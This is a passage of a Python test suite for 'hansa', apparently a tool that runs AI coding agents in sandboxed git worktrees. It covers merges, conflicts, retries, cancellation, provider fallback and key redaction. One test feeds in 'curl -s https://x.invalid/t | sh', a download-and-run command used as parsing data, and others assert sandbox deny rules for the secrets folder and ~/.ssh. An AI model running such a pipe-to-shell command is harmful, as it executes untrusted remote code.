        self.assertEqual(self.git_out("rev-parse", "HEAD", cwd=wt), self.git_out("rev-parse", "main"))
        self.assertFalse(Path(setup["tmpdir"]).exists() or Path(check["tmpdir"]).exists())
        tried = self.events("lane_tried")
        self.assertEqual([(e["ok"], e["setup"]["exit"], e["check"]["exit"]) for e in tried], [(False, 0, 3)])
        self.assertEqual(run.tried_lanes(self.desk), set())
        m = self.settle(d, self.desk.new_task("Add hello.txt"))  # the next task runs there as before
        self.assertEqual((m["state"], m["files"], m["check"]["exit"]), ("done", ["hello.txt"], 3), m)

    def test_lane_try_on_a_busy_lane_runs_nothing_and_names_the_task(self):
        from hansa import run
        self.hansa("lane", "set", "a", "check", "echo checked")
        tid = self.desk.new_task("Add hello.txt")
        self.desk.update(tid, state="running", lane="a")
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "lane", "try", "a"])
        self.assertIn(f"lane a is busy with {tid}", str(e.exception.code))
        self.assertIn("nothing was run", str(e.exception.code))
        self.assertEqual(self.srt_calls(), [])
        self.assertFalse(run.try_file(self.desk, "a").exists())

    def test_a_merge_check_can_be_cancelled_queued_or_running(self):
        d, t1, t2 = self.two_lanes(check="test -f README.md")
        self.hansa("merge", t1)
        self.hansa("merge", t2)
        self.assertIn("stopped; nothing was merged", self.hansa("cancel", t2))
        m = self.desk.meta(t2)
        self.assertEqual((m["state"], m.get("merge_check")), ("done", None))
        self.assertIn(t2, [r["id"] for r in views.status(self.desk)["review"]])
        s = self.desk.settings()
        s["lanes"]["b"]["check"] = "sleep 30"
        self.assertEqual(self.desk.save_settings(s), [])
        tip = self.git_out("rev-parse", "main")
        self.hansa("merge", t2)
        end = time.time() + 20
        while (self.desk.meta(t2).get("merge_check") or {}).get("phase") != "running" and time.time() < end:
            d.tick()
            time.sleep(0.1)
        self.hansa("cancel", t2)
        d.tick()
        m = self.desk.meta(t2)
        self.assertEqual((m["state"], m.get("merge_check"), self.git_out("rev-parse", "main")), ("done", None, tip))

    def test_a_conflict_lists_its_files_and_lines(self):
        d = Dispatcher(self.desk)
        t1, t2 = self.desk.new_task("Add hello.txt"), self.desk.new_task("Add hello.txt too")
        for t in (t1, t2):
            self.settle(d, t)
        self.hansa("merge", t1)
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "merge", t2])
        said = str(e.exception.code)
        self.assertIn(f"{t2} conflicts with main; nothing was merged", said)
        self.assertIn("hello.txt, lines 1-5:", said)
        self.assertIn(f"hello from {t1}", said)
        self.assertIn(f"hello from {t2}", said)
        self.assertLess(said.index(f"hansa retry {t2} --update"), said.index(f"hansa retry {t2} --fresh"))
        self.assertEqual(self.git_out("status", "--porcelain"), "")  # the merge was aborted after it was read
        for cmd in re.findall(r"hansa (retry [^;()]*?\"<[^>]*>\")", said):  # the advice is commands that parse
            self.assertEqual(shlex.split(cmd)[:2], ["retry", t2])
            with unittest.mock.patch("hansa.cli.cmd_retry") as retry:
                main(["--desk", str(self.desk.root), *shlex.split(cmd)])
            self.assertTrue(retry.call_args[0][0].note)

    def test_retry_update_leaves_the_conflict_to_the_worker_and_then_merges_cleanly(self):
        d = Dispatcher(self.desk)
        t1, t2 = self.desk.new_task("Add hello.txt"), self.desk.new_task("Add hello.txt too")
        for t in (t1, t2):
            self.settle(d, t)
        self.hansa("merge", t1)
        seen, argv = self.tmp / "seen.txt", self.tmp / "argv.jsonl"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_SEE": str(seen), "FAKE_SHOW_ARGV": str(argv)}
        self.assertEqual(self.desk.save_settings(s), [])
        out = self.hansa("retry", t2, "--update", "keep", "the", "newer", "greeting")
        t3 = self.desk.meta(t2)["replaced_by"]
        self.assertIn("with the current main merged into its branch", out)
        m = self.settle(d, t3)
        self.assertEqual(m["state"], "done", m)
        started_with = seen.read_text()  # the markers were in the file when the worker started
        self.assertIn("<<<<<<<", started_with)
        self.assertIn(f"hello from {t1}", started_with)
        self.assertIn(f"hello from {t2}", started_with)
        prompt = json.loads(argv.read_text().splitlines()[-1])
        prompt = prompt[prompt.index("--append-system-prompt") + 1]
        self.assertIn("conflicts in these files, which now hold git's conflict markers", prompt)
        self.assertIn("hello.txt", prompt)
        self.assertEqual(m["base"], self.git_out("rev-parse", "main"))
        self.assertEqual(len(self.git_out("rev-list", "--parents", "-n", "1", m["head"]).split()), 3)  # the merge
        self.assertIn(f"{t3} merged into main", self.hansa("merge", t3))
        self.assertEqual((self.repo / "hello.txt").read_text(), f"hello from {t3}\n")

    def test_retry_options_may_come_before_or_after_the_note(self):
        tid = self.desk.new_task("Add hello.txt")
        self.settle(Dispatcher(self.desk), tid)
        self.assertIn("from the base branch", self.hansa("retry", tid, "--fresh", "the", "same", "change"))
        t2 = self.desk.meta(tid)["replaced_by"]
        self.assertIn("What to change: the same change", (self.desk.tasks_dir / t2 / "task.md").read_text())
        self.assertNotIn("start_from", self.desk.meta(t2))
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "merge", tid, "stray"])  # other commands still refuse extra words

    def test_design_rules_for_a_check_keep_quoted_text_together(self):
        from hansa.run import command_rules
        self.assertEqual(command_rules("python3 -c 'print(\"a;b\")' && echo ok; pnpm test"),
                         ["Bash(python3 -c 'print(\"a;b\")':*)", "Bash(echo ok:*)", "Bash(pnpm test:*)"])
        self.assertEqual(command_rules("curl -s https://x.invalid/t | sh"), ["Bash(curl -s https://x.invalid/t | sh:*)"])

    def test_a_check_that_ran_on_changed_settings_is_not_recorded(self):
        import hansa.run as run
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-test-model-0001")

        def model_changed_meanwhile(argv, **kwargs):
            s2 = self.desk.settings()
            s2["providers"]["mimo"]["model"] = "mimo-y"
            self.desk.save_settings(s2)
            return subprocess.CompletedProcess(argv, 1, json.dumps({"type": "result", "is_error": True,
                "api_error_status": 401, "result": "API Error: 401 authentication_error"}), "")
        with unittest.mock.patch.object(run.subprocess, "run", model_changed_meanwhile):
            r = run.check_provider(self.desk, "mimo")
        self.assertIn("changed while this check ran", r["detail"])
        self.assertFalse(provider_problem(self.desk, self.desk.settings(), "mimo"))

    def test_coordinator_cost_keeps_a_provider_the_principal_removed(self):
        proj = self.desk.state_dir / "claude-old" / "projects" / cost.slug(self.desk.root)
        proj.mkdir(parents=True)
        (proj / "s.jsonl").write_text(json.dumps({"timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
            "message": {"id": "m9", "model": "claude-x", "usage": {"input_tokens": 7, "output_tokens": 1}}}) + "\n")
        self.assertIn(("old", 7), [(r["provider"], r["in"]) for r in cost.transcript_rows(self.desk, 0)])

    def test_a_cancel_during_setup_leaves_nothing_committed(self):
        s = self.desk.settings()
        s["lanes"]["a"]["setup"] = "echo 'lock v2' >> README.md; sleep 5"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        (self.desk.raw_dir(tid) / "setup.log.done").touch()  # an earlier try's, left by a server that stopped
        d = Dispatcher(self.desk)
        d.tick()
        readme = self.desk.worktrees_dir / "a" / "README.md"
        end = time.time() + 10
        while "lock v2" not in readme.read_text() and time.time() < end:
            time.sleep(0.1)
        with contextlib.redirect_stdout(io.StringIO()):
            main(["--desk", str(self.desk.root), "cancel", tid])
        m = self.settle(d, tid)
        self.assertEqual((m["state"], m["commits"], m["files"]), ("cancelled", 0, []), m)

    def test_keys_are_kept_out_of_task_texts_and_requests(self):
        key = "sk-test-in-text-0111"
        self.desk.write_key("mimo", key)
        tid = self.desk.new_task(f"Use {key} to call the endpoint", title=f"call with {key}")
        n = self.desk.add_ask(f"Is {key} still valid?")
        self.assertNotIn(key, (self.desk.tasks_dir / tid / "task.md").read_text())
        self.assertNotIn(key, (self.desk.tasks_dir / tid / "meta.json").read_text())
        self.assertNotIn(key, self.desk.asks_path.read_text())
        later = "sk-saved-later-0222"
        tid2 = self.desk.new_task(f"Mention {later} in the notes")
        self.desk.close_ask(n, f"use {later} instead")
        self.desk.write_key("mimo", later)  # saved after it was written down
        self.assertNotIn(later, (self.desk.tasks_dir / tid2 / "task.md").read_text())
        self.assertNotIn(later, self.desk.asks_path.read_text())
        self.assertIn("[key of mimo]", (self.desk.tasks_dir / tid2 / "task.md").read_text())

    def test_a_second_server_on_the_same_desk_refuses_to_start(self):
        from hansa.cli import hold_server_lock
        held = hold_server_lock(self.desk)
        self.addCleanup(held.close)
        r = subprocess.run([str(Path(__file__).resolve().parent.parent / "bin" / "hansa"), "--desk", str(self.desk.root),
                            "serve", "--port", "0"], capture_output=True, text=True, timeout=20)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("another hansa serve", r.stdout + r.stderr)

    def test_the_web_command_ends_when_its_connection_does(self):
        # run over ssh to keep a tunnel to the page open; a closed window or a laptop gone to sleep
        # must not leave it running on the server
        env = {k: v for k, v in os.environ.items() if k not in ("HANSA_ROLE", "HANSA_TASK")}
        p = subprocess.Popen([str(Path(__file__).resolve().parent.parent / "bin" / "hansa"), "--desk", str(self.desk.root),
                              "web"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
        self.addCleanup(lambda: p.poll() is None and p.kill())
        self.addCleanup(p.stdout.close)
        self.assertIn("/?t=", p.stdout.readline().decode())
        p.stdin.close()  # what sshd does when the connection closes
        try:
            code = p.wait(timeout=5)
        except subprocess.TimeoutExpired:
            self.fail("hansa web kept running after its connection closed")
        self.assertEqual(code, 0)

    def test_a_task_cancelled_while_hansa_prepares_it_never_runs(self):
        import hansa.run as run
        seen = self.tmp / "argv.jsonl"
        s = self.desk.settings()
        s["lanes"]["a"]["env"] = {"FAKE_SHOW_ARGV": str(seen)}
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        real = run.prepare

        def cancelled_meanwhile(desk, *args, **kwargs):
            with contextlib.redirect_stdout(io.StringIO()):
                main(["--desk", str(desk.root), "cancel", tid])
            return real(desk, *args, **kwargs)
        with unittest.mock.patch.object(run, "prepare", cancelled_meanwhile):
            Dispatcher(self.desk).tick()
        self.assertEqual(self.desk.meta(tid)["state"], "cancelled")
        self.assertFalse(seen.exists())  # no worker was started

    def test_a_task_left_half_started_by_a_stopped_server_is_queued_again(self):
        tid = self.desk.new_task("Add hello.txt")
        self.desk.update(tid, state="running", phase="starting", lane="a", provider="claude", started=time.time(),
                         pid=None)
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["files"]), ("done", ["hello.txt"]), m)

    def test_hansa_only_stops_the_process_it_started_and_all_of_its_group(self):
        from hansa.run import alive, proc_start, stop
        leader = subprocess.Popen([sys.executable, "-c",
            "import subprocess, sys, time\n"
            "c = subprocess.Popen([sys.executable, '-c', 'import signal, time; "
            "signal.signal(signal.SIGTERM, signal.SIG_IGN); time.sleep(60)'])\n"
            "print(c.pid, flush=True); time.sleep(60)"], stdout=subprocess.PIPE, text=True, start_new_session=True)
        child = int(leader.stdout.readline())
        self.addCleanup(lambda: [os.kill(p, 9) for p in (child, leader.pid) if alive(p)])
        started = proc_start(leader.pid)
        self.assertTrue(started)
        self.assertFalse(alive(leader.pid, "not-this-process"))  # a pid reused by another process is not ours
        stop(leader.pid, "not-this-process")
        self.assertIsNone(leader.poll())
        stop(leader.pid, started)
        leader.wait(timeout=20)
        end = time.time() + 10
        while alive(child) and time.time() < end:
            time.sleep(0.1)
        self.assertFalse(alive(child))  # it ignored the polite signal, so the group was killed

    def sleeper(self, *args, env=None):
        p = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)", *args], env=env,
                             start_new_session=True)
        self.addCleanup(lambda: (p.kill(), p.wait()))
        return p

    @unittest.skipIf(sys.platform.startswith("linux"), "Linux reads /proc")
    def test_without_proc_a_start_time_tells_one_process_from_another(self):
        from hansa.run import alive, proc_start
        a, b = self.sleeper(), self.sleeper()
        self.assertTrue(proc_start(a.pid))
        self.assertEqual(proc_start(a.pid), proc_start(a.pid))
        self.assertNotEqual(proc_start(a.pid), proc_start(b.pid))
        self.assertTrue(alive(a.pid, proc_start(a.pid)))
        self.assertFalse(alive(a.pid, proc_start(b.pid)))
        self.assertTrue(alive(a.pid, "Sat Sep 26 10:00:00 2026"))  # ps's start text, from before: unknown

    @unittest.skipIf(sys.platform.startswith("linux"), "Linux reads /proc")
    def test_without_proc_an_ended_child_not_yet_reaped_has_ended(self):
        from hansa.run import has_ended
        p = self.sleeper()
        self.assertFalse(has_ended(p))
        os.kill(p.pid, 9)
        end = time.time() + 10
        while not has_ended(p) and time.time() < end:
            time.sleep(0.1)
        self.assertTrue(has_ended(p))
        self.assertIsNone(p.returncode)  # seen without reaping it

    @unittest.skipIf(sys.platform.startswith("linux"), "Linux reads /proc")
    def test_without_proc_a_group_runs_until_it_is_killed(self):
        from hansa.run import group_running
        p = self.sleeper()
        self.assertTrue(group_running(p.pid))
        os.killpg(p.pid, 9)
        end = time.time() + 10
        while group_running(p.pid) and time.time() < end:
            time.sleep(0.1)
        self.assertFalse(group_running(p.pid))  # its leader is not reaped yet, and does not count

    @unittest.skipIf(sys.platform.startswith("linux"), "Linux reads /proc")
    def test_without_proc_a_word_is_found_in_arguments_but_not_in_the_environment(self):
        from hansa.run import pids_with_arg
        word = f"hansa-test-{os.getpid()}"
        p = self.sleeper(word, env={**os.environ, "HANSA_TEST_WORD": word})
        end = time.time() + 10
        while p.pid not in pids_with_arg(word) and time.time() < end:  # until its arguments are set
            time.sleep(0.1)
        self.assertEqual(pids_with_arg(word), [p.pid])
        self.assertEqual(pids_with_arg(f"HANSA_TEST_WORD={word}"), [])  # the same word, in its environment

    def test_off_macos_an_unreadable_proc_gives_an_unknown_start_and_state(self):
        import ctypes
        from hansa import run
        p = self.sleeper()
        with unittest.mock.patch.object(run, "_ON_MAC", False), \
                unittest.mock.patch.object(Path, "read_text", side_effect=OSError("gone")), \
                unittest.mock.patch.object(run, "_sysctl", side_effect=AssertionError("sysctl off macOS")):
            self.assertEqual(run.proc_start(p.pid), "")
            self.assertEqual(run._state(p.pid), "")
        with unittest.mock.patch.object(ctypes, "CDLL", return_value=object()):  # a libc without sysctl
            self.assertIsNone(run._sysctl(1, 14, 1, p.pid))

    def test_a_process_list_that_grows_between_the_two_sysctl_calls_is_asked_for_again(self):
        import ctypes
        import errno
        from hansa import run
        listed = [b"ab", b"abcdefgh"]  # between the two calls, more processes started than the slack has room for

        def sysctl(name, n, buf, sizep, new, newlen):
            size = sizep._obj
            if buf is None:
                size.value = len(listed[0])
                return 0
            if len(listed) > 1:
                listed.pop(0)
            if size.value < len(listed[0]):
                ctypes.set_errno(errno.ENOMEM)
                return -1
            ctypes.memmove(buf, listed[0], len(listed[0]))
            size.value = len(listed[0])
            return 0
        libc = type("libc", (), {"sysctl": staticmethod(sysctl)})()
        with unittest.mock.patch.object(ctypes, "CDLL", return_value=libc):
            self.assertEqual(run._sysctl(1, 14, 0, slack=2), b"abcdefgh")

    def test_the_lane_setup_runs_before_every_task_without_provider_keys(self):
        trace = self.tmp / "setup-trace.txt"
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        s["lanes"]["a"]["providers"] = ["mimo"]
        s["lanes"]["a"]["setup"] = f'echo installing; echo "token=${{ANTHROPIC_AUTH_TOKEN:-none}}" >> "{trace}"'
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-test-setup-0001")
        d = Dispatcher(self.desk)
        first = self.desk.new_task("Add hello.txt")
        self.assertEqual(self.settle(d, first)["state"], "done")
        second = self.desk.new_task("Add hello.txt again")
        self.assertEqual(self.settle(d, second)["state"], "done")
        self.assertEqual(trace.read_text().splitlines(), ["token=none", "token=none"])  # the same worktree, again
        self.assertIn("installing", (self.desk.tasks_dir / second / "setup.log").read_text())

    def test_what_the_setup_changes_in_the_repository_is_not_part_of_the_task(self):
        s = self.desk.settings()
        s["lanes"]["a"]["setup"] = "echo generated > made-by-setup.txt; echo 'lock v2' >> README.md"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual((m["state"], m["files"]), ("done", ["hello.txt"]), m)
        stashes = subprocess.run(["git", "stash", "list"], cwd=m["worktree"], capture_output=True, text=True).stdout
        self.assertIn("hansa: what the lane's setup changed", stashes)
        self.assertIn("set aside", (self.desk.tasks_dir / tid / "setup.log").read_text())

    def test_a_failing_setup_fails_the_task_with_its_output_and_never_holds_up_the_server(self):
        s = self.desk.settings()
        s["lanes"]["a"]["setup"] = "sleep 2; echo 'registry: API Error: 429 rate_limit_error'; exit 3"
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        d = Dispatcher(self.desk)
        t0 = time.time()
        d.tick()
        self.assertLess(time.time() - t0, 1.5)  # the setup runs in the worker's own process, not in hansa serve
        m = self.settle(d, tid)
        self.assertEqual(m["state"], "failed", m)
        self.assertIn("setup command failed (exit 3)", m["error"])
        self.assertEqual(self.srt_calls()[-1]["stdout"], "pipe")  # read into the log by a process outside srt
        self.assertIn("registry: API Error: 429", views.show_text(self.desk, tid))
        self.assertFalse(provider_problem(self.desk, self.desk.settings(), "claude"))  # not the provider's quota
        self.assertEqual(m["attempts"], [])

    def test_the_lane_setup_runs_in_srt_with_the_workers_sandbox(self):
        seen, m2 = self.tmp / "argv.jsonl", self.tmp / "m2"
        m2.mkdir()
        s = self.desk.settings()
        s["lanes"]["a"].update(setup='echo "tmp=$TMPDIR"', network=["registry.npmjs.org", "localhost:5173"],
                               write=[str(m2)], env={"FAKE_SHOW_ARGV": str(seen)})
        self.assertEqual(self.desk.save_settings(s), [])
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual(m["state"], "done", m)
        [call] = self.srt_calls()
        argv, got = call["argv"], call["settings"]
        self.assertEqual(argv[0], "--settings")
        self.assertEqual(argv[2:6], ["--", "/bin/sh", "-c", 'echo "tmp=$TMPDIR"'])
        self.assertEqual(call["stdout"], "pipe")  # not the log file in the raw folder srt hides
        self.assertEqual(Path(call["cwd"]).resolve(), Path(m["worktree"]).resolve())
        self.assertEqual(got["network"], {"allowedDomains": ["registry.npmjs.org", "localhost:5173"],
                                          "deniedDomains": [], "allowLocalBinding": True})
        worker = self.sandbox_of(json.loads(seen.read_text().splitlines()[-1]))["filesystem"]
        self.assertEqual(got["filesystem"]["denyRead"], worker["denyRead"])  # the same lists as the worker's
        self.assertEqual(got["filesystem"]["denyWrite"], worker["denyWrite"])
        self.assertIn(str(self.desk.secrets_dir), got["filesystem"]["denyRead"])
        self.assertIn(str(Path.home() / ".ssh"), got["filesystem"]["denyRead"])
        self.assertIn(str(Path(m["worktree"]) / ".git"), got["filesystem"]["denyWrite"])
        allow = got["filesystem"]["allowWrite"]
        self.assertIn(m["worktree"], allow)
        self.assertIn(str(m2), allow)
        self.assertTrue(call["tmp_there"])
        self.assertIn(call["tmpdir"], allow)  # TMPDIR is a folder the setup may write
        self.assertIn("tmp=" + call["tmpdir"], (self.desk.tasks_dir / tid / "setup.log").read_text())
        self.assertFalse(Path(call["tmpdir"]).exists())  # removed once the setup ended
        self.assertFalse((self.desk.state_dir / "runs" / tid).exists())  # the settings file too

    def test_without_srt_a_lane_with_setup_or_check_fails_its_tasks_and_one_with_neither_runs(self):
        d = Dispatcher(self.desk)
        with self.without_srt():
            m = self.settle(d, self.desk.new_task("Add hello.txt"))
            self.assertEqual(m["state"], "done", m)  # no setup, no check: no srt needed
            self.assertNotIn("srt MISSING", views.status_text(views.status(self.desk)))
            s = self.desk.settings()
            s["lanes"]["a"]["check"] = "echo checked"
            self.assertEqual(self.desk.save_settings(s), [])
            self.assertIn("srt MISSING", views.status_text(views.status(self.desk)))
            m = self.settle(d, self.desk.new_task("Add hello.txt again"))
            self.assertEqual(m["state"], "failed", m)
            self.assertIn("hansa needs srt", m["error"])
            self.assertIn("npm install -g @anthropic-ai/sandbox-runtime", m["error"])
            self.assertIn("coordinator can do this", m["error"])
            self.assertIn("npm install -g @anthropic-ai/sandbox-runtime", views.show_text(self.desk, m["id"]))
            s = self.desk.settings()
            s["lanes"]["a"].update(check="", setup="echo installing")
            self.assertEqual(self.desk.save_settings(s), [])
            m = self.settle(d, self.desk.new_task("Add hello.txt once more"))
            self.assertEqual(m["state"], "failed", m)
            self.assertIn("hansa needs srt", m["error"])
            self.assertIn("srt MISSING", views.status_text(views.status(self.desk)))
        self.assertEqual(self.srt_calls(), [])
        self.assertNotIn("srt MISSING", views.status_text(views.status(self.desk)))  # srt is back on the PATH

    def test_retry_is_only_for_a_task_that_has_ended(self):
        tid = self.desk.new_task("Add hello.txt")
        with self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "retry", tid, "again"])
        self.assertEqual([m["id"] for m in self.desk.tasks()], [tid])

    def test_quota_moves_task_to_next_provider(self):
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        s["lanes"]["a"]["providers"] = ["mimo", "claude"]
        s["lanes"]["a"]["env"] = {"FAKE_QUOTA_ON_COMPAT": "1"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-test-01")
        tid = self.desk.new_task("Add hello.txt")
        m = self.settle(Dispatcher(self.desk), tid)
        self.assertEqual(m["state"], "done", m)
        self.assertEqual(m["provider"], "claude")
        self.assertEqual(m["attempts"][0]["provider"], "mimo")
        self.assertIn("resting until", provider_problem(self.desk, self.desk.settings(), "mimo"))

    def test_rejected_key_rests_provider_until_a_new_key(self):
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        s["lanes"]["a"]["providers"] = ["mimo", "claude"]
        s["lanes"]["a"]["env"] = {"FAKE_BADKEY_ON_COMPAT": "1"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-wrong")
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Add hello.txt"))
        self.assertEqual((m["state"], m["provider"]), ("done", "claude"), m)
        self.assertIn("saving a new key", provider_problem(self.desk, self.desk.settings(), "mimo"))
        self.desk.write_key("mimo", "sk-right")
        self.assertEqual(provider_problem(self.desk, self.desk.settings(), "mimo"), "")

    def test_not_logged_in_rests_provider_until_a_check_answers(self):
        from hansa import run
        s = self.desk.settings()
        s["providers"]["mimo"] = {"kind": "compatible", "model": "mimo-x", "effort": "", "base_url": "https://example.invalid"}
        s["lanes"]["a"]["providers"] = ["mimo", "claude"]
        s["lanes"]["a"]["env"] = {"FAKE_NOLOGIN_ON_COMPAT": "1"}
        self.assertEqual(self.desk.save_settings(s), [])
        self.desk.write_key("mimo", "sk-test-01")
        m = self.settle(Dispatcher(self.desk), self.desk.new_task("Add hello.txt"))
        self.assertEqual((m["state"], m["provider"]), ("done", "claude"), m)
        self.assertEqual(m["attempts"][0]["error"], "not logged in (Please run /login)")
        prob = provider_problem(self.desk, self.desk.settings(), "mimo")
        self.assertIn("not logged in (Please run /login)", prob)
        self.assertIn("hansa check mimo", prob)
        self.assertIn("saving a new key", prob)
        self.assertNotIn("CLAUDE_CONFIG_DIR", prob)
        self.assertNotIn("log in", prob)
        self.assertIn("hansa check mimo", views.explain_text(self.desk, "provider", "mimo"))

        def answer(argv, **kwargs):  # logged in now
            return subprocess.CompletedProcess(argv, 0, json.dumps({"type": "result", "result": "OK"}), "")
        with unittest.mock.patch.object(run.subprocess, "run", answer):
            self.assertTrue(run.check_provider(self.desk, "mimo")["ok"])
        self.assertEqual(provider_problem(self.desk, self.desk.settings(), "mimo"), "")

    def test_the_provider_check_says_not_logged_in(self):
        from hansa import run

        def answer(argv, **kwargs):
            return subprocess.CompletedProcess(argv, 1, json.dumps({
                "type": "result", "subtype": "success", "is_error": True, "api_error_status": None,
                "terminal_reason": "api_error", "num_turns": 1, "result": "Not logged in · Please run /login"}), "")
        with unittest.mock.patch.object(run.subprocess, "run", answer):
            r = run.check_provider(self.desk, "claude")
        self.assertEqual((r["ok"], r["detail"]), (False, "not logged in (Please run /login)"))
        prob = provider_problem(self.desk, self.desk.settings(), "claude")
        self.assertTrue(prob.startswith("not logged in (Please run /login); log in with"), prob)
        shown = {p["name"]: p["problem"] for p in views.status(self.desk)["providers"]}
        self.assertEqual(shown["claude"], prob)
        self.assertIn("hansa check claude", prob)
        self.assertIn("log in with `claude`", prob)
        self.assertNotIn("CLAUDE_CONFIG_DIR", prob)
        s = self.desk.settings()
        s["providers"]["claude"]["config_dir"] = str(self.desk.root / "claude-home")
        self.assertEqual(self.desk.save_settings(s), [])
        prob = provider_problem(self.desk, self.desk.settings(), "claude")
        self.assertIn(f"CLAUDE_CONFIG_DIR={shlex.quote(str(self.desk.root / 'claude-home'))} claude", prob)
        self.assertIn("hansa check claude", prob)
        s["providers"]["claude"]["config_dir"] = "/Users/me/claude two"  # pastes as one word
        self.assertEqual(self.desk.save_settings(s), [])
        prob = provider_problem(self.desk, self.desk.settings(), "claude")
        self.assertIn("log in with `CLAUDE_CONFIG_DIR='/Users/me/claude two' claude`", prob)
        self.assertEqual(run.unusable_reason({"is_error": True, "result": "Invalid API key · Please run /login"}, "")[0],
                         "key")

    def test_a_config_dir_must_be_a_full_path(self):
        want = "provider claude: config_dir must be a full path starting with /"
        for bad in ("~/x", "x/y"):
            s = self.desk.settings()
            s["providers"]["claude"]["config_dir"] = bad
            self.assertIn(want, self.desk.save_settings(s), bad)
        self.assertEqual(self.desk.settings()["providers"]["claude"]["config_dir"], "")  # neither was saved
        s["providers"]["claude"]["config_dir"] = "/abs/path"
        self.assertEqual(self.desk.save_settings(s), [])

    def test_wait_returns_when_a_task_ends(self):
        tid = self.desk.new_task("Add hello.txt")
        d, stop, broke = Dispatcher(self.desk), threading.Event(), []

        def ticker():  # what stops it is raised here, not left to show as a task that never finished
            try:
                while not stop.is_set():
                    d.tick()
                    time.sleep(0.1)
            except BaseException as e:  # noqa: BLE001
                broke.append(e)
        th = threading.Thread(target=ticker)
        th.start()
        out = io.StringIO()
        try:
            with contextlib.redirect_stdout(out):
                main(["--desk", str(self.desk.root), "wait", "--timeout", "2", "--every", "0.1"])
        finally:
            stop.set()
            th.join()
        if broke:
            raise broke[0]
        self.assertIn(f"{tid} done", out.getvalue())
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            main(["--desk", str(self.desk.root), "wait"])
        self.assertIn("nothing to wait for", out.getvalue())

    def test_coordinator_passes_its_options_to_claude(self):
        echo = self.tmp / "echo-claude"
        echo.write_text("#!/bin/sh\necho \"$@\"\n")
        echo.chmod(0o755)
        (self.desk.root / "CLAUDE.md").write_text("an older card\n")
        (self.desk.root / ".claude" / "agents").mkdir(parents=True)
        (self.desk.root / ".claude" / "agents" / "verifier.md").write_text("a retired helper\n")
        r = subprocess.run([str(Path(__file__).resolve().parent.parent / "bin" / "hansa"), "--desk", str(self.desk.root),
                            "coordinator", "--permission-mode", "dontAsk"],
                           capture_output=True, text=True, env={**os.environ, "HANSA_CLAUDE": str(echo)})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("--permission-mode dontAsk", r.stdout)
        repo = self.repo.resolve()
        self.assertIn(f"--add-dir {repo}", r.stdout)
        self.assertIn(f"Edit(//{str(repo).lstrip('/')}/**)", r.stdout)
        self.assertIn("Agent(general-purpose) Agent(Explore)", r.stdout)  # Claude Code's own helpers are off
        code = Path(__file__).resolve().parent.parent / "hansa"
        self.assertEqual((self.desk.root / "CLAUDE.md").read_text(), (code / "card.md").read_text())
        agents = self.desk.root / ".claude" / "agents"
        for name in ("scout.md", "reviewer.md"):  # the desk's helpers come along
            self.assertEqual((agents / name).read_text(), (code / "agents" / name).read_text())
        self.assertIn("effort: medium", (agents / "scout.md").read_text())
        self.assertFalse((agents / "verifier.md").exists())  # retired, kept in .hansa/
        self.assertTrue(list(self.desk.state_dir.glob("verifier.md.*")))

    def test_the_coordinator_gets_an_operator_that_cannot_touch_code_or_keys(self):
        echo = self.tmp / "echo-claude"
        echo.write_text("#!/bin/sh\necho \"$@\"\n")
        echo.chmod(0o755)
        r = subprocess.run([str(Path(__file__).resolve().parent.parent / "bin" / "hansa"), "--desk", str(self.desk.root),
                            "coordinator"], capture_output=True, text=True, env={**os.environ, "HANSA_CLAUDE": str(echo)})
        self.assertEqual(r.returncode, 0, r.stderr)
        code = Path(__file__).resolve().parent.parent / "hansa"
        op = self.desk.root / ".claude" / "agents" / "operator.md"
        self.assertEqual(op.read_text(), (code / "agents" / "operator.md").read_text())
        tools = next(x for x in op.read_text().splitlines() if x.startswith("tools:"))
        self.assertIn("Bash", tools)
        self.assertIn("Edit", tools)
        # the helper runs with the coordinator's permissions, so these hold for it too
        self.assertIn(f"Edit(//{str(self.repo.resolve()).lstrip('/')}/**)", r.stdout)
        deny = json.loads((self.desk.root / ".claude" / "settings.json").read_text())["permissions"]["deny"]
        self.assertIn(f"Read(//{str(self.desk.root).lstrip('/')}/secrets/**)", deny)

    def test_coordinator_start_brings_the_desks_permissions_up_to_date(self):
        echo = self.tmp / "echo-claude"
        echo.write_text("#!/bin/sh\necho \"$@\"\n")
        echo.chmod(0o755)
        mine = self.desk.root / ".claude" / "settings.json"
